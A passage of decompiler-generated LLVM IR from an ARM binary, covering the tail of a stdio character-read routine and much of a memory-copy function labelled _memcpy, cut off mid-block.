  %v2_2d35c = icmp eq i32 %v1_2d35c, 0
  br i1 %v2_2d35c, label %.thread9, label %bb23

bb23:                                             ; preds = %dec_label_pc_2d35c
  %v1_2d364 = load i32, i32* @r5, align 4
  %v3_2d364 = add i32 %v1_2d364, 108
  %v4_2d364 = inttoptr i32 %v3_2d364 to i32*
  %v5_2d364 = load i32, i32* %v4_2d364, align 4
  store i32 %v5_2d364, i32* %r0.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_2d35c, %bb23
  %v1_2d368 = xor i1 %v2_2d35c, true
  call void @__pseudo_cond_branch(i1 %v1_2d368, i32 ptrtoint (i32* @global_var_25970.1568 to i32))
  %v0_2d36c = load i32, i32* @r4, align 4
  %v1_2d36c = add i32 %v0_2d36c, 8
  store i32 %v1_2d36c, i32* %r2.global-to-local, align 4
  %v1_2d370 = inttoptr i32 %v1_2d36c to i32*
  %v2_2d370 = load i32, i32* %v1_2d370, align 4
  store i32 %v2_2d370, i32* %r2.global-to-local, align 4
  %v3_2d370 = add i32 %v0_2d36c, 12
  %v4_2d370 = inttoptr i32 %v3_2d370 to i32*
  %v5_2d370 = load i32, i32* %v4_2d370, align 4
  %v9_2d374 = icmp eq i32 %v5_2d370, %v2_2d370
  br i1 %v9_2d374, label %dec_label_pc_2d3a8, label %dec_label_pc_2d37c

dec_label_pc_2d37c:                               ; preds = %.thread9
  %v2_2d37c = add i32 %v0_2d36c, 24
  %v3_2d37c = inttoptr i32 %v2_2d37c to i32*
  store i32 %v2_2d370, i32* %v3_2d37c, align 4
  %v0_2d380 = load i32, i32* @r4, align 4
  store i32 %v0_2d380, i32* %r0.global-to-local, align 4
  %v2_2d384 = call i32 @__stdio_rfill(i32 %v0_2d380)
  store i32 %v2_2d384, i32* %r0.global-to-local, align 4
  %v2_2d388 = icmp eq i32 %v2_2d384, 0
  br i1 %v2_2d388, label %dec_label_pc_2d3c4, label %dec_label_pc_2d390

dec_label_pc_2d390:                               ; preds = %dec_label_pc_2d37c
  %v0_2d390 = load i32, i32* @r4, align 4
  %v1_2d390 = add i32 %v0_2d390, 20
  %v2_2d390 = inttoptr i32 %v1_2d390 to i32*
  %v3_2d390 = load i32, i32* %v2_2d390, align 4
  %v2_2d394 = add i32 %v0_2d390, 24
  %v3_2d394 = inttoptr i32 %v2_2d394 to i32*
  store i32 %v3_2d390, i32* %v3_2d394, align 4
  %v0_2d398 = load i32, i32* @r4, align 4
  %v1_2d398 = add i32 %v0_2d398, 16
  %v2_2d398 = inttoptr i32 %v1_2d398 to i32*
  %v3_2d398 = load i32, i32* %v2_2d398, align 4
  %v1_2d39c = inttoptr i32 %v3_2d398 to i8*
  %v2_2d39c = load i8, i8* %v1_2d39c, align 1
  %v3_2d39c = zext i8 %v2_2d39c to i32
  store i32 %v3_2d39c, i32* %r0.global-to-local, align 4
  %v5_2d39c = add i32 %v3_2d398, 1
  store i32 %v5_2d39c, i32* %v2_2d398, align 4
  br label %dec_label_pc_2d3c8

dec_label_pc_2d3a8:                               ; preds = %.thread9
  %v1_2d3a8 = inttoptr i32 %v0_2d36c to i16*
  store i32 %v0_2d36c, i32* %r0.global-to-local, align 4
  %v2_2d3ac = ptrtoint i8* %stack_var_-17 to i32
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_2d3b4 = call i32 @__stdio_READ(i16* %v1_2d3a8, i32 %v2_2d3ac, i32 1)
  store i32 %v5_2d3b4, i32* %r0.global-to-local, align 4
  %v2_2d3b8 = icmp eq i32 %v5_2d3b4, 0
  br i1 %v2_2d3b8, label %dec_label_pc_2d3c4, label %bb24

bb24:                                             ; preds = %dec_label_pc_2d3a8
  %v4_2d3bc = load i8, i8* %stack_var_-17, align 1
  %v5_2d3bc = sext i8 %v4_2d3bc to i32
  store i32 %v5_2d3bc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2d3c8

dec_label_pc_2d3c4:                               ; preds = %dec_label_pc_2d3a8, %dec_label_pc_2d2ec, %dec_label_pc_2d37c
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2d3c8

dec_label_pc_2d3c8:                               ; preds = %bb, %.thread7, %bb24, %.thread4, %dec_label_pc_2d390, %dec_label_pc_2d308, %dec_label_pc_2d3c4
  %v2_2d3cc = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_2d3cc, i32* @r4, align 4
  store i32 %v6_2d2b0, i32* @r5, align 4
  store i32 %v9_2d2b0, i32* @lr, align 4
  %v1_2d3d0 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_2d3d0

; uselistorder directives
  uselistorder i32 %v2_2d330, { 1, 0, 2 }
  uselistorder i32 %v2_2d33c, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 %v3_2d2b4, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-17, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 11, 0, 1, 4, 2, 3, 10, 5, 6, 7, 8, 9, 13, 12 }
  uselistorder i32 108, { 0, 2, 3, 4, 1, 5, 6, 8, 7, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder label %dec_label_pc_2d3c8, { 6, 2, 4, 1, 3, 5, 0 }
  uselistorder label %dec_label_pc_2d3c4, { 0, 2, 1 }
  uselistorder label %.thread9, { 1, 0 }
}

define i32 @_memcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i8*, align 4
  %v0_2d3e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_2d3e0 = load i32, i32* %r0.global-to-local, align 4
  %v2_2d3e0 = sub i32 %v0_2d3e0, %v1_2d3e0
  %v3_2d3e0 = icmp ult i32 %v0_2d3e0, %v1_2d3e0
  %v4_2d3e0 = xor i32 %v1_2d3e0, %v0_2d3e0
  %v5_2d3e0 = xor i32 %v2_2d3e0, %v0_2d3e0
  %v6_2d3e0 = and i32 %v5_2d3e0, %v4_2d3e0
  %v7_2d3e0 = icmp slt i32 %v6_2d3e0, 0
  store i1 %v7_2d3e0, i1* %cpsr_v.global-to-local, align 1
  %v8_2d3e0 = icmp slt i32 %v2_2d3e0, 0
  store i1 %v8_2d3e0, i1* %cpsr_n.global-to-local, align 1
  %v9_2d3e0 = icmp eq i32 %v0_2d3e0, %v1_2d3e0
  store i1 %v9_2d3e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_2d3e0, label %dec_label_pc_2d634, label %dec_label_pc_2d3e8

dec_label_pc_2d3e8:                               ; preds = %entry
  br i1 %v9_2d3e0, label %.thread130, label %bb

.thread130:                                       ; preds = %bb154, %.thread129, %bb151, %dec_label_pc_2d3e8
  %merge = phi i32 [ %v0_2d3e0, %dec_label_pc_2d3e8 ], [ %v2_2d6c8, %bb151 ], [ %v11_2d6e4, %bb154 ], [ %v7_2d6e4, %.thread129 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_2d3e8
  %v5_2d3ec = inttoptr i32 %v1_2d3e0 to i8*
  store i8* %v5_2d3ec, i8** %stack_var_-8, align 4
  %v8_2d3ec = load i32, i32* @lr, align 4
  %v0_2d3f0 = load i32, i32* @r2, align 4
  %v2_2d3f0 = add i32 %v0_2d3f0, -4
  store i32 %v2_2d3f0, i32* %r2.global-to-local, align 4
  %v4_2d3f0 = sub i32 3, %v0_2d3f0
  %v5_2d3f0 = and i32 %v4_2d3f0, %v0_2d3f0
  %v6_2d3f0 = icmp slt i32 %v5_2d3f0, 0
  store i1 %v6_2d3f0, i1* %cpsr_v.global-to-local, align 1
  %v7_2d3f0 = icmp slt i32 %v2_2d3f0, 0
  store i1 %v7_2d3f0, i1* %cpsr_n.global-to-local, align 1
  %v8_2d3f0 = icmp eq i32 %v0_2d3f0, 4
  store i1 %v8_2d3f0, i1* %cpsr_z.global-to-local, align 1
  %v5_2d3f4 = icmp slt i32 %v0_2d3f0, 4
  br i1 %v5_2d3f4, label %bb141, label %dec_label_pc_2d3f8

dec_label_pc_2d3f8:                               ; preds = %bb
  %v1_2d3f8 = urem i32 %v1_2d3e0, 4
  store i32 %v1_2d3f8, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_2d3f8 = icmp eq i32 %v1_2d3f8, 0
  store i1 %v2_2d3f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2d3f8, label %dec_label_pc_2d400, label %dec_label_pc_2d4ac

dec_label_pc_2d400:                               ; preds = %dec_label_pc_2d3f8
  %v1_2d400 = urem i32 %v0_2d3e0, 4
  store i32 %v1_2d400, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_2d400 = icmp eq i32 %v1_2d400, 0
  store i1 %v2_2d400, i1* %cpsr_z.global-to-local, align 1
  %extract.t = trunc i32 %v0_2d3e0 to i2
  br i1 %v2_2d400, label %dec_label_pc_2d408, label %dec_label_pc_2d4dc

dec_label_pc_2d408:                               ; preds = %dec_label_pc_2d400, %dec_label_pc_2d4d4
  %v0_2d42094 = phi i32 [ %v1_2d3e0, %dec_label_pc_2d400 ], [ %v0_2d5fc77, %dec_label_pc_2d4d4 ]
  %v0_2d41c93 = phi i32 [ %v0_2d3e0, %dec_label_pc_2d400 ], [ %v0_2d4d4, %dec_label_pc_2d4d4 ]
  %v0_2d408 = phi i32 [ %v2_2d3f0, %dec_label_pc_2d400 ], [ %v2_2d4cc, %dec_label_pc_2d4d4 ]
  %v1_2d408 = add i32 %v0_2d408, -8
  store i32 %v1_2d408, i32* %r2.global-to-local, align 4
  %v3_2d408 = sub i32 7, %v0_2d408
  %v4_2d408 = and i32 %v3_2d408, %v0_2d408
  %v5_2d408 = icmp slt i32 %v4_2d408, 0
  store i1 %v5_2d408, i1* %cpsr_v.global-to-local, align 1
  %v6_2d408 = icmp slt i32 %v1_2d408, 0
  store i1 %v6_2d408, i1* %cpsr_n.global-to-local, align 1
  %v7_2d408 = icmp eq i32 %v0_2d408, 8
  store i1 %v7_2d408, i1* %cpsr_z.global-to-local, align 1
  %v2_2d40c = xor i1 %v6_2d408, %v5_2d408
  br i1 %v2_2d40c, label %dec_label_pc_2d45c, label %dec_label_pc_2d410

dec_label_pc_2d410:                               ; preds = %dec_label_pc_2d408
  %v1_2d410 = add i32 %v0_2d408, -28
  store i32 %v1_2d410, i32* %r2.global-to-local, align 4
  %v3_2d410 = sub i32 27, %v0_2d408
  %v4_2d410 = and i32 %v3_2d410, %v1_2d408
  %v5_2d410 = icmp slt i32 %v4_2d410, 0
  store i1 %v5_2d410, i1* %cpsr_v.global-to-local, align 1
  %v6_2d410 = icmp slt i32 %v1_2d410, 0
  store i1 %v6_2d410, i1* %cpsr_n.global-to-local, align 1
  %v7_2d410 = icmp eq i32 %v1_2d408, 20
  store i1 %v7_2d410, i1* %cpsr_z.global-to-local, align 1
  %v2_2d414 = xor i1 %v6_2d410, %v5_2d410
  br i1 %v2_2d414, label %dec_label_pc_2d448, label %dec_label_pc_2d418

dec_label_pc_2d418:                               ; preds = %dec_label_pc_2d410
  %v0_2d418 = load i32, i32* @r4, align 4
  store i32 %v0_2d418, i32* %stack_var_-12, align 4
  br label %dec_label_pc_2d41c

dec_label_pc_2d41c:                               ; preds = %dec_label_pc_2d41c.dec_label_pc_2d41c_crit_edge, %dec_label_pc_2d418
  %v0_2d420 = phi i32 [ %v12_2d428, %dec_label_pc_2d41c.dec_label_pc_2d41c_crit_edge ], [ %v0_2d42094, %dec_label_pc_2d418 ]
  %v0_2d41c = phi i32 [ %v0_2d41c.pre, %dec_label_pc_2d41c.dec_label_pc_2d41c_crit_edge ], [ %v0_2d41c93, %dec_label_pc_2d418 ]
  %v1_2d41c = inttoptr i32 %v0_2d41c to i32*
  %v2_2d41c = load i32, i32* %v1_2d41c, align 4
  %v3_2d41c = add i32 %v0_2d41c, 4
  %v4_2d41c = inttoptr i32 %v3_2d41c to i32*
  %v5_2d41c = load i32, i32* %v4_2d41c, align 4
  store i32 %v5_2d41c, i32* %r4.global-to-local, align 4
  %v6_2d41c = add i32 %v0_2d41c, 8
  %v7_2d41c = inttoptr i32 %v6_2d41c to i32*
  %v8_2d41c = load i32, i32* %v7_2d41c, align 4
  store i32 %v8_2d41c, i32* %ip.global-to-local, align 4
  %v9_2d41c = add i32 %v0_2d41c, 12
  %v10_2d41c = inttoptr i32 %v9_2d41c to i32*
  %v11_2d41c = load i32, i32* %v10_2d41c, align 4
  store i32 %v11_2d41c, i32* %lr.global-to-local, align 4
  %v12_2d41c = add i32 %v0_2d41c, 16
  store i32 %v12_2d41c, i32* %r1.global-to-local, align 4
  %v1_2d420 = inttoptr i32 %v0_2d420 to i32*
  store i32 %v2_2d41c, i32* %v1_2d420, align 4
  %v3_2d420 = add i32 %v0_2d420, 4
  %v4_2d420 = inttoptr i32 %v3_2d420 to i32*
  %v5_2d420 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_2d420, i32* %v4_2d420, align 4
  %v6_2d420 = add i32 %v0_2d420, 8
  %v7_2d420 = inttoptr i32 %v6_2d420 to i32*
  %v8_2d420 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_2d420, i32* %v7_2d420, align 4
  %v9_2d420 = add i32 %v0_2d420, 12
  %v10_2d420 = inttoptr i32 %v9_2d420 to i32*
  %v11_2d420 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_2d420, i32* %v10_2d420, align 4
  %v12_2d420 = add i32 %v0_2d420, 16
  store i32 %v12_2d420, i32* %r0.global-to-local, align 4
  %v0_2d424 = load i32, i32* %r1.global-to-local, align 4
  %v1_2d424 = inttoptr i32 %v0_2d424 to i32*
  %v2_2d424 = load i32, i32* %v1_2d424, align 4
  store i32 %v2_2d424, i32* @r3, align 4
  %v3_2d424 = add i32 %v0_2d424, 4
  %v4_2d424 = inttoptr i32 %v3_2d424 to i32*
  %v5_2d424 = load i32, i32* %v4_2d424, align 4
  store i32 %v5_2d424, i32* %r4.global-to-local, align 4
  %v6_2d424 = add i32 %v0_2d424, 8
  %v7_2d424 = inttoptr i32 %v6_2d424 to i32*
  %v8_2d424 = load i32, i32* %v7_2d424, align 4
  store i32 %v8_2d424, i32* @ip, align 4
  %v9_2d424 = add i32 %v0_2d424, 12
  %v10_2d424 = inttoptr i32 %v9_2d424 to i32*
  %v11_2d424 = load i32, i32* %v10_2d424, align 4
  store i32 %v11_2d424, i32* %lr.global-to-local, align 4
  %v12_2d424 = add i32 %v0_2d424, 16
  store i32 %v12_2d424, i32* %r1.global-to-local, align 4
  %v1_2d428 = inttoptr i32 %v12_2d420 to i32*
  store i32 %v2_2d424, i32* %v1_2d428, align 4
  %v3_2d428 = add i32 %v0_2d420, 20
  %v4_2d428 = inttoptr i32 %v3_2d428 to i32*
  %v5_2d428 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_2d428, i32* %v4_2d428, align 4
  %v6_2d428 = add i32 %v0_2d420, 24
  %v7_2d428 = inttoptr i32 %v6_2d428 to i32*
  %v8_2d428 = load i32, i32* @ip, align 4
  store i32 %v8_2d428, i32* %v7_2d428, align 4
  %v9_2d428 = add i32 %v0_2d420, 28
  %v10_2d428 = inttoptr i32 %v9_2d428 to i32*
  %v11_2d428 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_2d428, i32* %v10_2d428, align 4
  %v12_2d428 = add i32 %v0_2d420, 32
  store i32 %v12_2d428, i32* %r0.global-to-local, align 4
  %v0_2d42c = load i32, i32* %r2.global-to-local, align 4
  %v1_2d42c = add i32 %v0_2d42c, -32
  store i32 %v1_2d42c, i32* %r2.global-to-local, align 4
  %v3_2d42c = sub i32 31, %v0_2d42c
  %v4_2d42c = and i32 %v3_2d42c, %v0_2d42c
  %v5_2d42c = icmp slt i32 %v4_2d42c, 0
  %v6_2d42c = icmp slt i32 %v1_2d42c, 0
  %v2_2d430 = xor i1 %v6_2d42c, %v5_2d42c
  br i1 %v2_2d430, label %dec_label_pc_2d434, label %dec_label_pc_2d41c.dec_label_pc_2d41c_crit_edge

dec_label_pc_2d41c.dec_label_pc_2d41c_crit_edge:  ; preds = %dec_label_pc_2d41c
  %v0_2d41c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_2d41c

dec_label_pc_2d434:                               ; preds = %dec_label_pc_2d41c
  %v1_2d434 = add i32 %v0_2d42c, -16
  %v3_2d434 = add i32 %v0_2d42c, 2147483616
  %v4_2d434 = and i32 %v1_2d434, %v3_2d434
  %v5_2d434 = icmp slt i32 %v4_2d434, 0
  store i1 %v5_2d434, i1* %cpsr_v.global-to-local, align 1
  %v6_2d434 = icmp slt i32 %v1_2d434, 0
  store i1 %v6_2d434, i1* %cpsr_n.global-to-local, align 1
  %v7_2d434 = icmp eq i32 %v1_2d434, 0
  store i1 %v7_2d434, i1* %cpsr_z.global-to-local, align 1
  %v2_2d438 = xor i1 %v6_2d434, %v5_2d434
  br i1 %v2_2d438, label %bb138, label %bb137

bb137:                                            ; preds = %dec_label_pc_2d434
  %v3_2d438 = load i32, i32* %r1.global-to-local, align 4
  %v4_2d438 = inttoptr i32 %v3_2d438 to i32*
  %v5_2d438 = load i32, i32* %v4_2d438, align 4
  store i32 %v5_2d438, i32* @r3, align 4
  %v6_2d438 = add i32 %v3_2d438, 4
  %v7_2d438 = inttoptr i32 %v6_2d438 to i32*
  %v8_2d438 = load i32, i32* %v7_2d438, align 4
  store i32 %v8_2d438, i32* %r4.global-to-local, align 4
  %v9_2d438 = add i32 %v3_2d438, 8
  %v10_2d438 = inttoptr i32 %v9_2d438 to i32*
  %v11_2d438 = load i32, i32* %v10_2d438, align 4
  store i32 %v11_2d438, i32* @ip, align 4
  %v12_2d438 = add i32 %v3_2d438, 12
  %v13_2d438 = inttoptr i32 %v12_2d438 to i32*
  %v14_2d438 = load i32, i32* %v13_2d438, align 4
  store i32 %v14_2d438, i32* %lr.global-to-local, align 4
  %v15_2d438 = add i32 %v3_2d438, 16
  store i32 %v15_2d438, i32* %r1.global-to-local, align 4
  %v4_2d43c = inttoptr i32 %v12_2d428 to i32*
  store i32 %v5_2d438, i32* %v4_2d43c, align 4
  %v6_2d43c = add i32 %v0_2d420, 36
  %v7_2d43c = inttoptr i32 %v6_2d43c to i32*
  %v8_2d43c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v8_2d43c, i32* %v7_2d43c, align 4
  %v9_2d43c = add i32 %v0_2d420, 40
  %v10_2d43c = inttoptr i32 %v9_2d43c to i32*
  %v11_2d43c = load i32, i32* @ip, align 4
  store i32 %v11_2d43c, i32* %v10_2d43c, align 4
  %v12_2d43c = add i32 %v0_2d420, 44
  %v13_2d43c = inttoptr i32 %v12_2d43c to i32*
  %v14_2d43c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v14_2d43c, i32* %v13_2d43c, align 4
  %v15_2d43c = add i32 %v0_2d420, 48
  store i32 %v15_2d43c, i32* %r0.global-to-local, align 4
  %v3_2d440 = load i32, i32* %r2.global-to-local, align 4
  %v4_2d440 = add i32 %v3_2d440, -16
  store i32 %v4_2d440, i32* %r2.global-to-local, align 4
  br label %bb138

bb138:                                            ; preds = %dec_label_pc_2d434, %bb137
  %v3_2d450102111 = phi i32 [ %v15_2d43c, %bb137 ], [ %v12_2d428, %dec_label_pc_2d434 ]
  %v0_2d448.pre = phi i32 [ %v4_2d440, %bb137 ], [ %v1_2d42c, %dec_label_pc_2d434 ]
  %v2_2d444 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_2d444, i32* @r4, align 4
  br label %dec_label_pc_2d448

dec_label_pc_2d448:                               ; preds = %dec_label_pc_2d410, %bb138
  %v3_2d450101 = phi i32 [ %v0_2d42094, %dec_label_pc_2d410 ], [ %v3_2d450102111, %bb138 ]
  %v0_2d448 = phi i32 [ %v1_2d410, %dec_label_pc_2d410 ], [ %v0_2d448.pre, %bb138 ]
  %v1_2d448 = add i32 %v0_2d448, 20
  store i32 %v1_2d448, i32* %r2.global-to-local, align 4
  %v3_2d448 = sub i32 0, %v0_2d448
  %v4_2d448 = and i32 %v1_2d448, %v3_2d448
  %v5_2d448 = icmp slt i32 %v4_2d448, 0
  store i1 %v5_2d448, i1* %cpsr_v.global-to-local, align 1
  %v6_2d448 = icmp slt i32 %v1_2d448, 0
  store i1 %v6_2d448, i1* %cpsr_n.global-to-local, align 1
  %v7_2d448 = icmp eq i32 %v1_2d448, 0
  store i1 %v7_2d448, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_2d44c

dec_label_pc_2d44c:                               ; preds = %.thread115, %dec_label_pc_2d448
  %v0_2d45c.pre158 = phi i32 [ %v0_2d45c.pre, %.thread115 ], [ %v1_2d448, %dec_label_pc_2d448 ]
  %v3_2d450 = phi i32 [ %v3_2d45099116, %.thread115 ], [ %v3_2d450101, %dec_label_pc_2d448 ]
  %v1_2d454 = phi i1 [ %v1_2d458, %.thread115 ], [ %v5_2d448, %dec_label_pc_2d448 ]
  %v0_2d454 = phi i1 [ %v0_2d458, %.thread115 ], [ %v6_2d448, %dec_label_pc_2d448 ]
  %v2_2d44c = xor i1 %v1_2d454, %v0_2d454
  br i1 %v2_2d44c, label %.thread115, label %bb139

bb139:                                            ; preds = %dec_label_pc_2d44c
  %v3_2d44c = load i32, i32* %r1.global-to-local, align 4
  %v4_2d44c = inttoptr i32 %v3_2d44c to i32*
  %v5_2d44c = load i32, i32* %v4_2d44c, align 4
  store i32 %v5_2d44c, i32* @r3, align 4
  %v6_2d44c = add i32 %v3_2d44c, 4
  %v7_2d44c = inttoptr i32 %v6_2d44c to i32*
  %v8_2d44c = load i32, i32* %v7_2d44c, align 4
  store i32 %v8_2d44c, i32* @ip, align 4
  %v9_2d44c = add i32 %v3_2d44c, 8
  %v10_2d44c = inttoptr i32 %v9_2d44c to i32*
  %v11_2d44c = load i32, i32* %v10_2d44c, align 4
  store i32 %v11_2d44c, i32* %lr.global-to-local, align 4
  %v12_2d44c = add i32 %v3_2d44c, 12
  store i32 %v12_2d44c, i32* %r1.global-to-local, align 4
  %v4_2d450 = inttoptr i32 %v3_2d450 to i32*
  store i32 %v5_2d44c, i32* %v4_2d450, align 4
  %v6_2d450 = add i32 %v3_2d450, 4
  %v7_2d450 = inttoptr i32 %v6_2d450 to i32*
  %v8_2d450 = load i32, i32* @ip, align 4
  store i32 %v8_2d450, i32* %v7_2d450, align 4
  %v9_2d450 = add i32 %v3_2d450, 8
  %v10_2d450 = inttoptr i32 %v9_2d450 to i32*
  %v11_2d450 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_2d450, i32* %v10_2d450, align 4
  %v12_2d450 = add i32 %v3_2d450, 12
  store i32 %v12_2d450, i32* %r0.global-to-local, align 4
  %v3_2d454 = load i32, i32* %r2.global-to-local, align 4
  %v4_2d454 = add i32 %v3_2d454, -12
  store i32 %v4_2d454, i32* %r2.global-to-local, align 4
  %v6_2d454 = sub i32 11, %v3_2d454
  %v7_2d454 = and i32 %v6_2d454, %v3_2d454
  %v8_2d454 = icmp slt i32 %v7_2d454, 0
  store i1 %v8_2d454, i1* %cpsr_v.global-to-local, align 1
  %v9_2d454 = icmp slt i32 %v4_2d454, 0
  store i1 %v9_2d454, i1* %cpsr_n.global-to-local, align 1
  %v10_2d454 = icmp eq i32 %v3_2d454, 12
  store i1 %v10_2d454, i1* %cpsr_z.global-to-local, align 1
  br label %.thread115

.thread115:                                       ; preds = %dec_label_pc_2d44c, %bb139
  %v0_2d45c.pre = phi i32 [ %v4_2d454, %bb139 ], [ %v0_2d45c.pre158, %dec_label_pc_2d44c ]
  %v3_2d45099116 = phi i32 [ %v12_2d450, %bb139 ], [ %v3_2d450, %dec_label_pc_2d44c ]
  %v1_2d458 = phi i1 [ %v8_2d454, %bb139 ], [ %v1_2d454, %dec_label_pc_2d44c ]
  %v0_2d458 = phi i1 [ %v9_2d454, %bb139 ], [ %v0_2d454, %dec_label_pc_2d44c ]
  %v2_2d458 = xor i1 %v1_2d458, %v0_2d458
  br i1 %v2_2d458, label %dec_label_pc_2d45c, label %dec_label_pc_2d44c

dec_label_pc_2d45c:                               ; preds = %.thread115, %dec_label_pc_2d408
  %v4_2d46c = phi i32 [ %v0_2d42094, %dec_label_pc_2d408 ], [ %v3_2d45099116, %.thread115 ]
  %v0_2d45c = phi i32 [ %v1_2d408, %dec_label_pc_2d408 ], [ %v0_2d45c.pre, %.thread115 ]
  %v1_2d45c = add i32 %v0_2d45c, 8
  store i32 %v1_2d45c, i32* %r2.global-to-local, align 4
  %v3_2d45c = sub i32 0, %v0_2d45c
  %v4_2d45c = and i32 %v1_2d45c, %v3_2d45c
  %v5_2d45c = icmp slt i32 %v4_2d45c, 0
  store i1 %v5_2d45c, i1* %cpsr_v.global-to-local, align 1
  %v6_2d45c = icmp slt i32 %v1_2d45c, 0
  store i1 %v6_2d45c, i1* %cpsr_n.global-to-local, align 1
  %v7_2d45c = icmp eq i32 %v1_2d45c, 0
  store i1 %v7_2d45c, i1* %cpsr_z.global-to-local, align 1
  %v2_2d460 = xor i1 %v6_2d45c, %v5_2d45c
  br i1 %v2_2d460, label %bb141, label %dec_label_pc_2d464

dec_label_pc_2d464:                               ; preds = %dec_label_pc_2d45c
  %v1_2d464 = add i32 %v0_2d45c, 4
  store i32 %v1_2d464, i32* %r2.global-to-local, align 4
  %v3_2d464 = sub i32 -5, %v0_2d45c
  %v4_2d464 = and i32 %v3_2d464, %v1_2d45c
  %v5_2d464 = icmp slt i32 %v4_2d464, 0
  store i1 %v5_2d464, i1* %cpsr_v.global-to-local, align 1
  %v6_2d464 = icmp slt i32 %v1_2d464, 0
  store i1 %v6_2d464, i1* %cpsr_n.global-to-local, align 1
  %v7_2d464 = icmp eq i32 %v1_2d45c, 4
  store i1 %v7_2d464, i1* %cpsr_z.global-to-local, align 1
  %v2_2d468 = xor i1 %v6_2d464, %v5_2d464
  %v3_2d468 = load i32, i32* %r1.global-to-local, align 4
  %v4_2d468 = inttoptr i32 %v3_2d468 to i32*
  %v5_2d468 = load i32, i32* %v4_2d468, align 4
  store i32 %v5_2d468, i32* @r3, align 4
  %v7_2d468 = add i32 %v3_2d468, 4
  br i1 %v2_2d468, label %.thread122, label %bb140

.thread122:                                       ; preds = %dec_label_pc_2d464
  store i32 %v7_2d468, i32* %r1.global-to-local, align 4
  %v5_2d46c = inttoptr i32 %v4_2d46c to i32*
  store i32 %v5_2d468, i32* %v5_2d46c, align 4
  %v6_2d46c = load i32, i32* %r0.global-to-local, align 4
  %v7_2d46c = add i32 %v6_2d46c, 4
  store i32 %v7_2d46c, i32* %r0.global-to-local, align 4
  %v0_2d47c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb141

bb140:                                            ; preds = %dec_label_pc_2d464
  %v7_2d470 = inttoptr i32 %v7_2d468 to i32*
  %v8_2d470 = load i32, i32* %v7_2d470, align 4
  store i32 %v8_2d470, i32* @ip, align 4
  %v9_2d470 = add i32 %v3_2d468, 8
  store i32 %v9_2d470, i32* %r1.global-to-local, align 4
  %v4_2d474 = inttoptr i32 %v4_2d46c to i32*
  store i32 %v5_2d468, i32* %v4_2d474, align 4
  %v6_2d474 = add i32 %v4_2d46c, 4
  %v7_2d474 = inttoptr i32 %v6_2d474 to i32*
  %v8_2d474 = load i32, i32* @ip, align 4
  store i32 %v8_2d474, i32* %v7_2d474, align 4
  %v9_2d474 = add i32 %v4_2d46c, 8
  store i32 %v9_2d474, i32* %r0.global-to-local, align 4
  %v3_2d478 = load i32, i32* %r2.global-to-local, align 4
  %v4_2d478 = add i32 %v3_2d478, -4
  store i32 %v4_2d478, i32* %r2.global-to-local, align 4
  br label %bb141

bb141:                                            ; preds = %.thread122, %.thread128, %dec_label_pc_2d45c, %bb, %dec_label_pc_2d62c, %dec_label_pc_2d5c0, %dec_label_pc_2d554, %bb140
  %v0_2d47c = phi i32 [ %v0_2d47c.pre, %.thread122 ], [ %v2_2d4cc, %.thread128 ], [ %v1_2d45c, %dec_label_pc_2d45c ], [ %v2_2d3f0, %bb ], [ %v0_2d47c61, %dec_label_pc_2d62c ], [ %v0_2d47c60, %dec_label_pc_2d5c0 ], [ %v0_2d47c59, %dec_label_pc_2d554 ], [ %v4_2d478, %bb140 ]
  %v1_2d47c = add i32 %v0_2d47c, 4
  store i32 %v1_2d47c, i32* %r2.global-to-local, align 4
  %v3_2d47c = sub i32 0, %v0_2d47c
  %v4_2d47c = and i32 %v1_2d47c, %v3_2d47c
  %v5_2d47c = icmp slt i32 %v4_2d47c, 0
  store i1 %v5_2d47c, i1* %cpsr_v.global-to-local, align 1
  %v6_2d47c = icmp slt i32 %v1_2d47c, 0
  store i1 %v6_2d47c, i1* %cpsr_n.global-to-local, align 1
  %v7_2d47c = icmp eq i32 %v1_2d47c, 0
  store i1 %v7_2d47c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_2d47c, label %bb142, label %bb141.bb143_crit_edge

bb141.bb143_crit_edge:                            ; preds = %bb141
  %v0_2d484.pre = load i32, i32* @r3, align 4
  br label %bb143

bb142:                                            ; preds = %bb141
